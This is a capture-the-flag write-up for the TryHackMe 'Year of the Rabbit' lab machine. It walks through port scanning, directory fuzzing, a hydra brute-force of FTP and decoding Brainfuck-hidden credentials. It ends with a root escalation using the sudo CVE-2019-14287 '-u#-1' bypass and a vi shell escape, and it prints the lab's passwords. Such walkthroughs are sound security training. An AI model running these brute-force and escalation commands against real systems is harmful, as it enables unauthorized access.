---
date: 2020-05-22 06:14:32
layout: post
title: "YearoftheRabbit"
subtitle: A machine full of rabbit holes.
description: Medium Machine from Tryhackme
image: /writeup/assets/img/yearoftherabbit/year.png
optimized_image:
category: tryhackme
tags: medium,tryhackme
author: cirius
paginate: false
---
 Staring with nmap scan to look for open ports,
 ```bash
$ nmap -T4 -p- -A 10.10.45.92
 Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-16 00:38 IST
Nmap scan report for 10.10.45.92
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.13 (92%), Linux 3.2 - 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   187.89 ms 10.8.0.1
2   212.33 ms 10.10.45.92

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.06 seconds
```

There are 3 ports open 21,22,80.
Since ftp port was open tried to login anonymously,but as shown by nmap scan anonymous login was not allowed.

Moving on to the second interseting port , i.e 80.

The homepage of website hosted at port 80 contains default apache2 page.
Tried to search for directories and pages available on the website using ffuf.
```bash
ffuf -w wordlist -u http://10.10.45.92/FUZZ -e .php,.html,.txt,.zip
```
![placeholder](/writeup/assets/img/yearoftherabbit/ffuf.png "ffuf")

This shows that there is a assets directory.
Visiting the directory, I found a style.css file and a video file.
The style.css file pointed me towards **/sup3r_s3cr3t_fl4g.php**
![placeholder](/writeup/assets/img/yearoftherabbit/style.css "style")

Visited http://10.10.45.92/sup3r_s3cr3t_fl4g.php. A popup told me to switch off the javascript. If I do not switch off js then I was redirected to a youtube video.
After switching off the javascript the video that was inside assets is played on the page.

Listening the video there is voice of man's *burp*.This voice is not present in original video at youtube.

Since the man was burping. So I thought to open Burpsuite and see the requests.

Looking at the requests made by browser when visiting /sup3r_s3cr3t_fl4g.php, I found one more page 
![placeholder](/writeup/assets/img/yearoftherabbit/burp.png "burp")

As visible in image the browser is requesting this address,
*http://10.10.45.92/intermediary.php?hidden_directory=/WExYY2Cv-qU*
Visiting the above URL , I was redirected to /sup3r_s3cr3t_fl4g.php.

I removed the hidden_directory parameter from the URL

*http://10.10.45.92/intermediary.php**

Accessing the above URL, this also redirected me.

As the URL contained the hidden_directory=/WExYY2Cv-qU. So I accessed the directory directly.
```URL
http://10.10.45.92/WExYY2Cv-qU
```
This directory contained an Image.
Downloading the image and using strings command on the image to extract any string in the image.
```bash
strings Hot_Babe.png
```
![placeholder](/writeup/assets/img/yearoftherabbit/ftp.png "ftp")

This gave a ftp username as ***ftpuser*** and some passwords.

Now to get the correct password, I used hydra to perform a wordlist attack.
```bash
hydra -l ftpuser -P passwords 10.10.45.92 ftp -V
```
![placeholder](/writeup/assets/img/yearoftherabbit/hydra.png "hydra")

This gave me the correct passsword for the ftpuser.
***ftpuser:5iez1wGXKfPKQ***

Logged in inside ftp using the above credentials.
```bash
ftp 10.10.45.92
```
Found a file named eli's_creds.txt inside the ftp server.

Downloaded the file and opening it presented me with a obfuscated text.
```text
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

This is brainfuck language.
Used <a href="https://www.dcode.fr/brainfuck-language">decode.fr></a> website to execute this code written in Brainfuck language.
![placeholder](/writeup/assets/img/yearoftherabbit/brainfuck.png "brainfuck")
This gave the SSH credentials for user eli.

***eli:DSpDiM1wAEwid***

Logging In through SSH , a message was displayed 
![placeholder](/writeup/assets/img/yearoftherabbit/ssh.png "ssh")

This message said something about s3cr3t hiding place.
I though maybe there is some directory named s3cr3t.So , executed this command to look for the directory named s3cr3t.
```bash
find / -name s3cr3t -type d 2>/dev/null
```
This gave a location where this directory was located, */usr/games/s3cr3t*
![placeholder](/writeup/assets/img/yearoftherabbit/secret.png "s3cr3t")

Inside the s3cr3t directory, there was a file named **.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!**

Inside the file found the password for gwendoline user.
Now I can write that in a proper format,

***gwendoline:MniVCQVhQHUNI***

Used the password to switch user.

Got the user flag.

Now to escalate privileges to root. I started with sudo -l which showed a interseting information.
![placeholder](/writeup/assets/img/yearoftherabbit/sudo.png "sudo")

The sudoers file had an entry for gwendline user which said that gwendoline user can run vi command to read user.txt as every other user except root.

But to escalate privileges I needed to run the vi command as root.

Looking for the version of sudo, I found it to be 1.8.10

Looking for any vulnerability in sudo. I found a vulnerablity related to *!root* statement of sudoers file.(***CVE-2019-14287***)

According to the vulnerability if user id "-1" or "4294967295" is used while executing the command that is listed to be not run as root in sudoers file. Then, it would run as root.

In simple language, if I run the command with user id -1 or 4294967295. Then I can run the vi as root.
```bash
sudo -u \#$((ffffffff)) /usr/bin/vi /home/gwendoline/user.txt
```

ffffffff is hexadecimal of 4294967295
This would also work
```bash
sudo -u#-1/usr/bin/vi /home/gwendoline/user.txt
```

This opened the vi with user.txt as root.

Time for GTFOBins

Used the command displayed on GTFOBins, to get the root shell.

```bash
:set shell=/bin/bash
:shell
```

Now I got the root shell.

Got the root flag.
  

